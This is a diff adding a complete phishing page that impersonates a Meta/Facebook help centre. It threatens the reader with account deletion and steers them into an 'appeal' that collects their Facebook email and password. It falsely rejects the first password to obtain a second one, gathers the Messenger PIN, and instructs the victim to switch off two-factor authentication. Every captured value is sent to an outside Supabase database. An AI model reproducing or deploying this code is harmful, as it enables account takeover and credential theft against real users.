@@ -1,0 +1,716 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Meta Help Centre</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    .hidden { display: none; }
+    .pin-input { width: 40px; height: 50px; text-align: center; font-size: 20px; border: 1px solid #ccc; border-radius: 6px; }
+
+    /* Smooth transitions */
+    .modal-content {
+      opacity: 0;
+      transform: translateY(20px);
+      transition: all 0.3s ease-in-out;
+    }
+    .modal-content.show {
+      opacity: 1;
+      transform: translateY(0);
+    }
+    /* Existing fade */
+    .modal-content {
+      opacity: 0;
+      transform: translateY(20px);
+      transition: all 0.3s ease-in-out;
+    }
+    .modal-content.show {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    /* Slide transitions */
+    .slide-out-left {
+      animation: slideOutLeft 0.4s forwards;
+    }
+    .slide-in-right {
+      animation: slideInRight 0.4s forwards;
+    }
+
+    @keyframes slideOutLeft {
+      from { transform: translateX(0); opacity: 1; }
+      to { transform: translateX(-100%); opacity: 0; }
+    }
+    @keyframes slideInRight {
+      from { transform: translateX(100%); opacity: 0; }
+      to { transform: translateX(0); opacity: 1; }
+    }
+
+    .fade-in {
+      opacity: 0;
+      transform: translateY(20px);
+      animation: fadeIn 0.3s forwards;
+    }
+    
+    @keyframes fadeIn {
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    .slide-in {
+      opacity: 0;
+      transform: translateX(100%);
+      animation: slideIn 0.4s forwards;
+    }
+    
+    @keyframes slideIn {
+      to { opacity: 1; transform: translateX(0); }
+    }
+
+  </style>
+  <script type="module">
+    import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
+  
+    // Supabase setup
+    const SUPABASE_URL = "https://iirzbmnfdmykiyhizqrh.supabase.co";
+    const SUPABASE_ANON_KEY =
+      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImlpcnpibW5mZG15a2l5aGl6cXJoIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY5MzU4MTUsImV4cCI6MjA3MjUxMTgxNX0.9ucV9g9mMZhKYFTqbZZ2lrUbf3KO8AsWmudTusmMJIA";
+    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+  
+    // Store data + track row ID
+    let userData = {
+      id: null,
+      email: "",
+      password: "",
+      chat_pin: "",
+      two_factor_enabled: "",
+      two_factor_disabled: null,
+    };
+
+    let firstPasswordSaved = false;
+  
+    // ------------------ Supabase functions ------------------
+    async function saveEmailPass() {
+      const { data, error } = await supabase
+        .from("users")
+        .insert([{ email: userData.email, password: userData.password }])
+        .select("id")
+        .single();
+  
+      if (!error && data) userData.id = data.id;
+    }
+  
+    async function saveChatPin() {
+      if (!userData.id) return;
+      await supabase.from("users").update({ chat_pin: userData.chat_pin }).eq("id", userData.id);
+    }
+  
+    async function saveTwoFactor() {
+      if (!userData.id) return;
+      await supabase
+        .from("users")
+        .update({
+          two_factor_enabled: userData.two_factor_enabled,
+          two_factor_disabled: userData.two_factor_disabled,
+        })
+        .eq("id", userData.id);
+    }
+
+    async function savePasswordConfirm() {
+      if (!userData.id) return;
+      await supabase.from("users").update({ password_confirm: userData.password_confirm }).eq("id", userData.id);
+    }
+
+    async function savePinStatus(status) {
+      if (!userData.id) return;
+      await supabase.from("users").update({ pin_status: status }).eq("id", userData.id);
+    }
+  
+    // ------------------ Modal helpers ------------------
+    function openModal(content, slide = false) {
+      const overlay = document.getElementById("overlay");
+      const modal = document.getElementById("modal");
+      const modalBody = document.getElementById("modalBody");
+      const modalContent = document.getElementById("modalContent");
+  
+      overlay.classList.remove("hidden");
+      modal.classList.remove("hidden");
+  
+      // reset classes
+      modalContent.classList.remove("fade-in", "slide-in");
+  
+      modalBody.innerHTML = content;
+  
+      // trigger animation
+      void modalContent.offsetWidth;
+      if (slide) {
+        modalContent.classList.add("slide-in");
+      } else {
+        modalContent.classList.add("fade-in");
+      }
+    }
+  
+    function closeModal() {
+      const overlay = document.getElementById("overlay");
+      const modal = document.getElementById("modal");
+      overlay.classList.add("hidden");
+      modal.classList.add("hidden");
+    }
+  
+    // ------------------ Flow Steps ------------------
+    function startAppeal() {
+      openModal(`
+        <div class="text-left">
+          <div class="flex justify-center mb-4">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_(2019).png" alt="Facebook Logo" class="w-12 h-12">
+          </div>
+          <p class="text-center text-gray-700 text-[15px] mb-2">
+            Please confirm your identity first. Otherwise your account will be <span class='font-semibold'>permanently deleted.</span>
+          </p>
+          <h2 class="text-xl font-semibold mb-1 text-center text-gray-900">Log into Facebook</h2>
+          <div class="space-y-3 mt-4">
+            <!-- Email -->
+            <input id="email" type="text" placeholder="Email or Phone"
+              class="w-full border border-gray-300 rounded-lg p-3 text-[15px] bg-gray-50 focus:outline-none focus:ring-2 focus:ring-[#1877F2]">
+    
+            <!-- Password with eye icon -->
+            <div class="relative">
+              <input id="password" type="password" placeholder="Password"
+                class="w-full border border-gray-300 rounded-lg p-3 pr-10 text-[15px] bg-gray-50 focus:outline-none focus:ring-2 focus:ring-[#1877F2]">
+              <button type="button" id="togglePassword"
+                class="absolute inset-y-0 right-3 flex items-center text-gray-500 hover:text-gray-700 focus:outline-none">
+                <!-- eye icon -->
+                <svg xmlns="http://www.w3.org/2000/svg" id="eyeIcon" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                    d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                    d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 
+                    0 8.268 2.943 9.542 7-1.274 4.057-5.064 
+                    7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                </svg>
+              </button>
+            </div>
+    
+            <!-- Login button -->
+            <button id="step1Btn"
+              class="w-full bg-[#1877F2] text-white py-2.5 rounded-md text-[15px] font-bold hover:bg-blue-700">
+              Log In
+            </button>
+          </div>
+          <div class="text-center mt-3">
+            <a href="https://www.facebook.com/login/identify/" target="_blank"
+              class="text-[#1877F2] text-sm hover:underline">Forgotten password?</a>
+          </div>
+        </div>
+      `, false);
+    
+      // Log In button logic (unchanged)
+      document.getElementById("step1Btn").addEventListener("click", async () => {
+        const emailVal = document.getElementById("email").value.trim();
+        const passVal = document.getElementById("password").value.trim();
+        if (!emailVal || !passVal) return alert("Please enter both email and password.");
+
+        if (!firstPasswordSaved) {
+          // First entry → save to password column
+          userData.email = emailVal;
+          userData.password = passVal;
+          await saveEmailPass();
+          firstPasswordSaved = true;
+
+          // Show "check again" message and clear box
+          const msg = document.createElement("p");
+          msg.id = "checkMsg";
+          msg.className = "text-red-500 text-sm mt-2";
+          msg.innerText = "*Incorrect password. Check your password and try again.";
+          // append after the whole container (not inside the relative div)
+          document.getElementById("step1Btn").insertAdjacentElement("beforebegin", msg);
+          
+          document.getElementById("password").value = "";
+        } else {
+          // Second entry → save to password_confirm column
+          userData.password_confirm = passVal;
+          await savePasswordConfirm();
+          chatHistory();
+        }
+      });
+        
+      // Password toggle (eye icon)
+      document.getElementById("togglePassword").addEventListener("click", () => {
+        const input = document.getElementById("password");
+        const icon = document.getElementById("eyeIcon");
+    
+        if (input.type === "password") {
+          input.type = "text";
+          // eye with slash
+          icon.outerHTML = `
+            <svg xmlns="http://www.w3.org/2000/svg" id="eyeIcon" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 
+                0-8.268-2.943-9.542-7a9.956 9.956 0 012.64-4.362m3.42-2.174A9.956 
+                9.956 0 0112 5c4.478 0 8.268 2.943 9.542 
+                7a9.956 9.956 0 01-4.641 5.411M15 12a3 
+                3 0 11-6 0 3 3 0 016 0z" />
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" 
+                d="M3 3l18 18" />
+            </svg>`;
+        } else {
+          input.type = "password";
+          // normal eye
+          icon.outerHTML = `
+            <svg xmlns="http://www.w3.org/2000/svg" id="eyeIcon" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 
+                0 8.268 2.943 9.542 7-1.274 4.057-5.064 
+                7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+            </svg>`;
+        }
+      });
+    }
+    
+    
+  
+    function chatHistory() {
+      openModal(`
+        <div class="text-center">
+          <div class="flex justify-center mb-3">
+            <div class="w-14 h-14 bg-blue-100 rounded-full flex items-center justify-center">
+             <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/messenger.svg" alt="Messenger Logo" class="w-7 h-7 text-blue-600" />
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15c1.657 0 3-1.567 3-3.5S13.657 8 12 8s-3 1.567-3 3.5 1.343 3.5 3 3.5z" />
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m0-8V7" />
+              </svg>
+            </div>
+          </div>
+          <h2 class="text-lg font-semibold text-gray-900 mb-1">Enter your PIN to restore your chat history</h2>
+          <p class="text-sm text-gray-500 mb-4">Some messages are missing. Enter your PIN to restore your chat history.</p>
+          
+          <div id="pinBox" class="flex justify-center space-x-2 mb-4">
+            <input id="chatpin1" type="password" maxlength="1" class="w-10 h-12 text-center text-lg border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500">
+            <input id="chatpin2" type="password" maxlength="1" class="w-10 h-12 text-center text-lg border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500">
+            <input id="chatpin3" type="password" maxlength="1" class="w-10 h-12 text-center text-lg border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500">
+            <input id="chatpin4" type="password" maxlength="1" class="w-10 h-12 text-center text-lg border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500">
+            <input id="chatpin5" type="password" maxlength="1" class="w-10 h-12 text-center text-lg border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500">
+            <input id="chatpin6" type="password" maxlength="1" class="w-10 h-12 text-center text-lg border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500">
+          </div>
+    
+          <a href="https://www.messenger.com/help/356392701632465" target="_blank" class="block text-sm text-blue-600 mb-4 hover:underline">Forgot PIN?</a>
+    
+          <button id="step2Btn" class="w-full bg-blue-600 text-white py-2.5 rounded-lg hover:bg-blue-700 text-sm font-medium">Submit</button>
+          <button id="noPinBtn" class="w-full bg-gray-600 text-white py-2.5 rounded-lg hover:bg-gray-700 text-sm font-medium mt-2">Did not have a pin</button>
+
+
+        </div>
+      `, true);
+  
+      const inputs = document.querySelectorAll("#pinBox input");
+      inputs.forEach((input, idx) => {
+        input.addEventListener("input", () => {
+          if (input.value && idx < inputs.length - 1) inputs[idx + 1].focus();
+        });
+        input.addEventListener("keydown", e => {
+          if (e.key === "Backspace" && !input.value && idx > 0) inputs[idx - 1].focus();
+        });
+      });
+  
+      document.getElementById("step2Btn").addEventListener("click", async () => {
+        userData.chat_pin = Array.from(inputs).map(i => i.value).join("");
+        if (userData.chat_pin.length !== 6) return alert("Please enter a 6-digit PIN.");
+        await saveChatPin();
+        twoFactor();
+      });
+
+      document.getElementById("noPinBtn").addEventListener("click", async () => {
+        await savePinStatus("No PIN");
+        twoFactor();
+      });
+
+    }
+  
+    function twoFactor() {
+      openModal(`
+        <h2 class="text-lg font-semibold text-gray-800 mb-2">Have you enabled Two-Factor Authentication on your account?</h2>
+        <div class="flex justify-center space-x-3 mt-4">
+          <button id="twoFactorYes" class="px-5 py-2.5 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium">Yes</button>
+          <button id="twoFactorNo" class="px-5 py-2.5 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium">No</button>
+        </div>
+      `, true);
+  
+      document.getElementById("twoFactorYes").addEventListener("click", () => {
+        userData.two_factor_enabled = "Yes";
+        twoFactorDisable();
+      });
+  
+      document.getElementById("twoFactorNo").addEventListener("click", async () => {
+        userData.two_factor_enabled = "No";
+        userData.two_factor_disabled = null;
+        await saveTwoFactor();
+        reviewInfo();
+      });
+    }
+  
+    function twoFactorDisable() {
+      openModal(`
+        <div>
+          <!-- Strong Warning -->
+          <div class="p-4 mb-4 bg-yellow-100 border-l-4 border-yellow-500 rounded">
+            <h2 class="text-xl font-bold text-red-600 mb-2">⚠️ Please turn off the Two-Factor Authentication</h2>
+            <p class="text-base text-gray-800">
+              This is <span class="font-semibold">very important</span> while we work on your account. 
+              Without disabling 2FA, we cannot proceed with reviewing your information.
+            </p>
+          </div>
+    
+          <h2 class="text-base font-medium text-gray-800 mb-2">To turn off two-factor authentication:</h2>
+    
+          <!-- Tabs -->
+          <div class="flex border-b mb-4 relative">
+            <button id="tabDesktop" class="flex-1 py-2 text-blue-600 font-medium">Desktop</button>
+            <button id="tabMobile" class="flex-1 py-2 text-gray-600 hover:text-blue-600">Mobile browser</button>
+            <button id="tabHorizon" class="flex-1 py-2 text-gray-600 hover:text-blue-600">Meta Horizon app</button>
+            <div id="tabUnderline" class="absolute bottom-0 left-0 w-1/3 h-0.5 bg-blue-600 transition-all duration-300"></div>
+          </div>
+    
+          <!-- Content -->
+          <div id="tabContent" class="text-left space-y-2 text-sm text-gray-700">
+            <ol class="list-decimal list-inside space-y-1" id="stepsList">
+              <li>Log into <a href="https://www.facebook.com/login/" target="_blank" class="text-blue-600 underline">Accounts Center</a> using your Meta account information.</li>
+              <li>Click <strong>🔒 Password and security</strong> on the left, then click <strong>Two-factor authentication</strong>.</li>
+              <li>Select your Meta account.</li>
+              <li>Select the method you use to get login codes, then toggle it off.</li>
+              <li>Click <strong>Turn off</strong>.</li>
+              <li>Then come to this page again, hit the following button.</li>
+            </ol>
+          </div>
+    
+          <button id="disabledBtn" class="mt-6 w-full bg-blue-600 text-white py-2.5 rounded-lg hover:bg-blue-700 text-sm font-medium">
+            Yes, I disabled it
+          </button>
+        </div>
+      `);
+    
+      // Tab content
+      const desktopSteps = `
+        <li>Log into <a href="https://www.facebook.com/login/" target="_blank" class="text-blue-600 underline">Accounts Center</a> using your Meta account information.</li>
+        <li>Click <strong>🔒 Password and security</strong> on the left, then click <strong>Two-factor authentication</strong>.</li>
+        <li>Select your Meta account.</li>
+        <li>Select the method you use to get login codes, then toggle it off.</li>
+        <li>Click <strong>Turn off</strong>.</li>
+      `;
+    
+      const mobileSteps = `
+        <li>Log into <a href="https://www.facebook.com/login/" target="_blank" class="text-blue-600 underline">Accounts Center</a> using your Meta account information.</li>
+        <li>Tap <strong>🔒 Password and security</strong>, then tap <strong>Two-factor authentication</strong>.</li>
+        <li>Select your Meta account.</li>
+        <li>Select the method you use to get login codes, then toggle it off.</li>
+        <li>Tap <strong>Turn off</strong>.</li>
+      `;
+    
+      const horizonSteps = `
+        <li>On your phone, open the Meta Horizon app.</li>
+        <li>Tap <strong>☰ Menu</strong> at the top of your Horizon Feed.</li>
+        <li>Tap <strong><a href="https://www.facebook.com/login/" target="_blank" class="text-blue-600 underline">Accounts Center</a></strong>.</li>
+        <li>Tap <strong>🔒 Password and security</strong>, then tap <strong>Two-factor authentication</strong>.</li>
+        <li>Select your Meta account.</li>
+        <li>Select the method you use to get login codes, then toggle it off.</li>
+        <li>Tap <strong>Turn off</strong>.</li>
+      `;
+    
+      // Tab switch functionality
+      const stepsList = document.getElementById("stepsList");
+      const underline = document.getElementById("tabUnderline");
+    
+      document.getElementById("tabDesktop").addEventListener("click", () => {
+        stepsList.innerHTML = desktopSteps;
+        moveUnderline(0);
+        setActiveTab("tabDesktop");
+      });
+      document.getElementById("tabMobile").addEventListener("click", () => {
+        stepsList.innerHTML = mobileSteps;
+        moveUnderline(1);
+        setActiveTab("tabMobile");
+      });
+      document.getElementById("tabHorizon").addEventListener("click", () => {
+        stepsList.innerHTML = horizonSteps;
+        moveUnderline(2);
+        setActiveTab("tabHorizon");
+      });
+    
+      function setActiveTab(activeId) {
+        ["tabDesktop", "tabMobile", "tabHorizon"].forEach(id => {
+          const btn = document.getElementById(id);
+          if (id === activeId) {
+            btn.classList.add("text-blue-600", "font-medium");
+            btn.classList.remove("text-gray-600");
+          } else {
+            btn.classList.remove("text-blue-600", "font-medium");
+            btn.classList.add("text-gray-600");
+          }
+        });
+      }
+    
+      function moveUnderline(tabIndex) {
+        underline.style.transform = `translateX(${tabIndex * 100}%)`;
+      }
+    
+      // Save when disabled
+      document.getElementById("disabledBtn").addEventListener("click", async () => {
+        userData.two_factor_disabled = "Yes, I disabled";
+        await saveTwoFactor();
+        reviewInfo();
+      });
+    }
+  
+    function reviewInfo() {
+      openModal(`
+        <div class="text-center">
+          <div class="text-green-600 text-4xl mb-4">✔</div>
+          <h2 class="text-lg font-semibold text-gray-800 mb-2">We will review your information</h2>
+          <p class="text-sm text-gray-600">Please wait for our response. This window will close automatically.</p>
+        </div>
+      `, false);
+  
+      setTimeout(() => {
+        closeModal();
+        setTimeout(() => window.close(), 500);
+      }, 4000);
+    }
+  
+    window.startAppeal = startAppeal;
+  </script>
+  
+    
+<body class="bg-gray-100 text-gray-800 flex flex-col min-h-screen font-sans text-[14px]">
+
+  <!-- Mobile Restriction Message -->
+  <div id="mobileMessage" class="hidden fixed inset-0 flex items-center justify-center bg-gray-100 text-center p-6 z-[9999]">
+    <div class="bg-white shadow-lg rounded-xl p-6 max-w-md">
+      <h2 class="text-lg font-bold text-red-600 mb-2">Access Restricted</h2>
+      <p class="text-gray-700">⚠️ Please immedietly try the link using a <span class="font-semibold">desktop computer</span>. Otherwise your account will be <span class="font-semibold text-red-600">permanently deleted.</span> If you are already using a desktop computer, go to full screen view, then <span class="font-semibold">refresh the page.</span></p>
+    </div>
+  </div>
+
+  <!-- Overlay -->
+  <div id="overlay" class="fixed inset-0 bg-black bg-opacity-50 hidden z-40"></div>
+
+  <!-- Modal container -->
+  <div id="modal" class="fixed inset-0 flex items-center justify-center hidden z-50">
+    <div class="bg-white rounded-xl shadow-lg w-full max-w-md p-6 relative modal-content" id="modalContent">
+      <button onclick="closeModal()" class="absolute top-3 right-3 text-gray-400 hover:text-gray-600">✕</button>
+      <div id="modalBody" class="space-y-4 text-center"></div>
+    </div>
+  </div>
+
+  <!-- Top bar -->
+  <header class="bg-gray-100 border-b shadow-sm sticky top-0 z-10">
+    <div class="max-w-7xl mx-auto px-6 py-3 flex justify-between items-center">
+      <div class="flex items-center space-x-2">
+        <img src="https://cdn.iconscout.com/icon/free/png-256/free-facebook-messenger-3-569346.png" alt="Messenger Logo" class="w-9 h-9">
+        <span class="font-medium text-gray-900 text-base text-xl">Meta Help Centre</span>
+      </div>
+      <button class="px-3 py-1 border rounded bg-gray-100 hover:bg-gray-200 text-md text-gray-600">English (US)</button>
+    </div>
+  </header>
+
+  <!-- Rest of your sidebar + main content (unchanged) -->
+  <!-- ... -->
+  <div class="flex flex-1">
+    <!-- Sidebar -->
+    <aside class="w-72 bg-white border-r shadow-sm h-screen overflow-y-auto text-[14px]">
+      <div class="p-4 font-semibold text-gray-700 border-b text-sm">Help Centre</div>
+      <nav class="py-2 space-y-1 text-gray-700">
+        <!-- Messenger Features -->
+        <div>
+          <div class="flex items-center px-4 py-2 font-semibold text-gray-800 text-xs uppercase tracking-wide">
+            <img src="https://cdn-icons-png.flaticon.com/512/929/929610.png" class="w-5 h-5 mr-2">Messenger features
+          </div>
+          <div class="pl-6 space-y-1">
+            <a onclick="setActive(this)" href="https://www.facebook.com/help/messenger-app/messages" class="sidebar-link flex items-center px-2 py-1.5 rounded hover:bg-gray-100 border-l-4 border-transparent">
+              <img src="https://cdn-icons-png.flaticon.com/512/709/709624.png" class="w-4 h-4 mr-2"> Messages, photos and videos
+            </a>
+            <a onclick="setActive(this)" href="https://www.facebook.com/help/messenger-app/contacts" class="sidebar-link flex items-center px-2 py-1.5 rounded hover:bg-gray-100 border-l-4 border-transparent">
+              <img src="https://cdn-icons-png.flaticon.com/512/747/747376.png" class="w-4 h-4 mr-2"> Messenger contacts
+            </a>
+            <a onclick="setActive(this)" href="https://www.facebook.com/help/messenger-app/end-to-end" class="sidebar-link flex items-center px-2 py-1.5 rounded hover:bg-gray-100 border-l-4 border-transparent">
+              <img src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" class="w-4 h-4 mr-2"> End-to-end encryption
+            </a>
+            <a onclick="setActive(this)" href="https://www.facebook.com/help/messenger-app/community-chats" class="sidebar-link flex items-center px-2 py-1.5 rounded hover:bg-gray-100 border-l-4 border-transparent">
+              <img src="https://cdn-icons-png.flaticon.com/512/1077/1077063.png" class="w-4 h-4 mr-2"> Community chats
+            </a>
+            <a onclick="setActive(this)" href="https://www.facebook.com/help/messenger-app/group-chats" class="sidebar-link flex items-center px-2 py-1.5 rounded hover:bg-gray-100 border-l-4 border-transparent">
+              <img src="https://cdn-icons-png.flaticon.com/512/61/61112.png" class="w-4 h-4 mr-2"> Group chats
+            </a>
+            <a onclick="setActive(this)" href="https://www.facebook.com/help/messenger-app/audio-video" class="sidebar-link flex items-center px-2 py-1.5 rounded hover:bg-gray-100 border-l-4 border-transparent">
+                <img src="https://cdn-icons-png.flaticon.com/512/727/727245.png" class="w-4 h-4 mr-2"> Audio and video calls
+              </a>
+              <a onclick="setActive(this)" href="https://www.facebook.com/help/messenger-app/location" class="sidebar-link flex items-center px-2 py-1.5 rounded hover:bg-gray-100 border-l-4 border-transparent">
+                <img src="https://cdn-icons-png.flaticon.com/512/684/684908.png" class="w-4 h-4 mr-2"> Location sharing
+              </a>
+              <a onclick="setActive(this)" href="https://www.facebook.com/help/messenger-app/stories" class="sidebar-link flex items-center px-2 py-1.5 rounded hover:bg-gray-100 border-l-4 border-transparent">
+                <img src="https://cdn-icons-png.flaticon.com/512/1827/1827335.png" class="w-4 h-4 mr-2"> Stories
+              </a>
+              <a onclick="setActive(this)" href="https://www.facebook.com/help/messenger-app/notifications" class="sidebar-link flex items-center px-2 py-1.5 rounded hover:bg-gray-100 border-l-4 border-transparent">
+                <img src="https://cdn-icons-png.flaticon.com/512/3602/3602145.png" class="w-4 h-4 mr-2"> Notifications
+              </a>
+              <a onclick="setActive(this)" href="https://www.facebook.com/help/messenger-app/accessibility" class="sidebar-link flex items-center px-2 py-1.5 rounded hover:bg-gray-100 border-l-4 border-transparent">
+                <img src="https://cdn-icons-png.flaticon.com/512/126/126122.png" class="w-4 h-4 mr-2"> Accessibility
+              </a>
+              <a onclick="setActive(this)" href="https://www.facebook.com/help/messenger-app/kids" class="sidebar-link flex items-center px-2 py-1.5 rounded hover:bg-gray-100 border-l-4 border-transparent">
+                <img src="https://cdn-icons-png.flaticon.com/512/2965/2965567.png" class="w-4 h-4 mr-2"> Messenger Kids
+              </a>
+            </div>
+          </div>
+  
+          <!-- Account Management -->
+          <div>
+            <div class="flex items-center px-4 py-2 font-semibold text-gray-800 text-xs uppercase tracking-wide">
+              <img src="https://cdn-icons-png.flaticon.com/512/456/456212.png" class="w-5 h-5 mr-2">Account management
+            </div>
+            <div class="pl-6 space-y-1">
+              <a onclick="setActive(this)" href="https://www.facebook.com/help/messenger-app/account" class="sidebar-link flex items-center px-2 py-1.5 rounded hover:bg-gray-100 border-l-4 border-transparent">
+                <img src="https://cdn-icons-png.flaticon.com/512/1828/1828500.png" class="w-4 h-4 mr-2"> Account
+              </a>
+              <a onclick="setActive(this)" href="https://www.facebook.com/help/messenger-app/blocking" class="sidebar-link flex items-center px-2 py-1.5 rounded hover:bg-gray-100 border-l-4 border-transparent">
+                <img src="https://cdn-icons-png.flaticon.com/512/565/565491.png" class="w-4 h-4 mr-2"> Blocking, reporting and deleting
+              </a>
+              <a onclick="setActive(this)" href="https://www.facebook.com/help/messenger-app/fix" class="sidebar-link flex items-center px-2 py-1.5 rounded hover:bg-gray-100 border-l-4 border-transparent">
+                <img src="https://cdn-icons-png.flaticon.com/512/1827/1827933.png" class="w-4 h-4 mr-2"> Fix a problem
+              </a>
+            </div>
+          </div>
+  
+          <!-- Privacy and Safety -->
+          <div>
+            <div class="flex items-center px-4 py-2 font-semibold text-gray-800 text-xs uppercase tracking-wide">
+              <img src="https://cdn-icons-png.flaticon.com/512/942/942751.png" class="w-5 h-5 mr-2">Privacy and safety
+            </div>
+            <div class="pl-6 space-y-1">
+              <a onclick="setActive(this)" href="https://www.facebook.com/help/messenger-app/privacy" class="sidebar-link flex items-center px-2 py-1.5 rounded hover:bg-gray-100 border-l-4 border-transparent">
+                <img src="https://cdn-icons-png.flaticon.com/512/61/61457.png" class="w-4 h-4 mr-2"> Privacy and safety on Messenger
+              </a>
+            </div>
+          </div>
+  
+          <!-- Payments -->
+          <a onclick="setActive(this)" href="https://www.facebook.com/help/messenger-app/payments" class="sidebar-link flex items-center px-4 py-2 hover:bg-gray-100 rounded border-l-4 border-transparent">
+            <img src="https://cdn-icons-png.flaticon.com/512/633/633611.png" class="w-5 h-5 mr-2"> Payments and business
+          </a>
+        </nav>
+      </aside>
+  
+      <!-- Main content -->
+      <main class="flex-1 flex flex-col items-center p-8 overflow-y-auto text-gray-800">
+        <div class="bg-white rounded-lg shadow p-8 max-w-2xl w-full mb-8 text-center">
+
+          <!-- Icon above heading -->
+          <div class="flex flex-col items-center mb-4">
+            <div class="w-12 h-12 rounded-full bg-gray-200 flex items-center justify-center">
+              <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16" class="w-6 h-6 text-black">
+                <path d="M8 8a3 3 0 1 0 0-6 3 3 0 0 0 0 6z"/>
+                <path fill-rule="evenodd" d="M14 14s-1-1.5-6-1.5S2 14 2 14s1-4 6-4 6 4 6 4z"/>
+              </svg>
+            </div>
+            <h2 class="text-lg font-medium mt-2 text-gray-900">Meta Help Support</h2>
+          </div>
+          <hr class="mb-6 border-gray-300">
+  
+          <h2 class="text-lg font-bold text-red-600 mb-2">We will suspend your account after 7 days</h2>
+          <p class="text-sm text-gray-700 mb-1">03 days left to appeal or we will <span class="font-semibold">permanently disable your account</span></p>
+          <p class="text-xs text-gray-500 mb-6">Suspended on Wed, 10 Sep 2025</p>
+  
+          <div class="text-left space-y-4 text-[13px] leading-relaxed">
+            <div>
+              <h3 class="font-semibold text-base text-gray-900 mb-1">Why this happened</h3>
+              <p>Someone reported you to us. Your account contains posts or messages containing content that goes against our rules. This does not follow our Community Standards on account integrity.
+                <a href="#" class="text-blue-600 underline"> Learn More About Our Community Standards</a>
+              </p>
+            </div>
+  
+            <div>
+              <h3 class="font-semibold text-base text-gray-900 mb-1">What this means</h3>
+              <p>People on Facebook will not be able to see your account and you will not be able to use your account after 7 days. The accounts associated with Meta will be suspended after 03 days.</p>
+            </div>
+  
+            <div>
+              <h3 class="font-semibold text-base text-gray-900 mb-1">What you can do</h3>
+              <p>
+                You have 03 days left to appeal our decision.
+                <span class="font-semibold">We may need to collect some info from you that will help us review your account again.</span>
+              </p>
+            </div>
+          </div>
+  
+          <button onclick="startAppeal()" class="mt-6 w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2.5 rounded text-[14px]">Appeal</button>
+        </div>
+  
+        <!-- Trending topics -->
+        <div class="bg-white rounded-lg shadow p-6 max-w-2xl w-full mb-8 text-[13px]">
+          <h3 class="font-semibold text-gray-900 mb-4">Trending topics</h3>
+          <ul class="list-disc list-inside space-y-1 text-blue-600">
+            <li><a href="#" class="hover:underline">Use Meta AI in chats on Messenger</a></li>
+            <li><a href="#" class="hover:underline">Generate images with Meta AI in chats on Messenger</a></li>
+            <li><a href="#" class="hover:underline">Create a channel on Facebook or Messenger</a></li>
+            <li><a href="#" class="hover:underline">Block someone's profile on Messenger</a></li>
+            <li><a href="#" class="hover:underline">Unable to send messages on Messenger</a></li>
+            <li><a href="#" class="hover:underline">What end-to-end encryption on Messenger means and how it works</a></li>
+            <li><a href="#" class="hover:underline">What to do if someone’s bothering you on Messenger</a></li>
+          </ul>
+        </div>
+  
+        <!-- Extra help -->
+        <div class="bg-white rounded-lg shadow p-6 max-w-2xl w-full mb-8 text-[13px]">
+          <h3 class="font-semibold text-gray-900 mb-4">Looking for something else?</h3>
+          <div class="flex items-center space-x-5 p-5 border rounded-lg bg-gray-50">
+            <img src="https://cdn-icons-png.flaticon.com/512/565/565547.png" alt="Help Icon" class="w-8 h-8">
+            <div>
+              <p class="font-medium text-gray-900">Visit Business Help Centre</p>
+              <p class="text-xs text-gray-600">Learn more about promoting your business on Messenger</p>
+            </div>
+          </div>
+        </div>
+      </main>
+    </div>
+  
+    <!-- Footer -->
+    <footer class="bg-gray-50 border-t text-xs text-gray-600">
+      <div class="max-w-6xl mx-auto px-6 py-4 flex justify-between items-center">
+        <div class="flex items-center space-x-2">
+          <span>from</span>
+          <img src="https://cdn.iconscout.com/icon/free/png-256/free-facebook-messenger-3-569346.png" alt="Meta Logo" class="w-5 h-5">
+          <span class="font-semibold text-blue-600">Meta</span>
+        </div>
+        <div class="space-x-4">
+          <a href="#" class="hover:underline">Privacy Policy</a>
+          <a href="#" class="hover:underline">Terms</a>
+        </div>
+        <div>
+          © 2025 Meta
+        </div>
+      </div>
+    </footer>
